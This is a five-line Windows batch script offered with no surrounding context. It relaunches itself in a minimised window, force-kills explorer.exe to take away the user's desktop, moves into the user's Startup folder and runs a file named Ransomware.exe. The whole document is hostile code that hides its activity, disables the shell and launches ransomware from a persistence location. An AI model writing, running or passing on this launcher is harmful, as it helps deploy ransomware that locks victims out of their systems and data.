if "%1" == "" start "" /min "%~dpnx0" MY_FLAG && exit
taskkill /F /IM explorer.exe
cd "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp"
Ransomware.exe
exit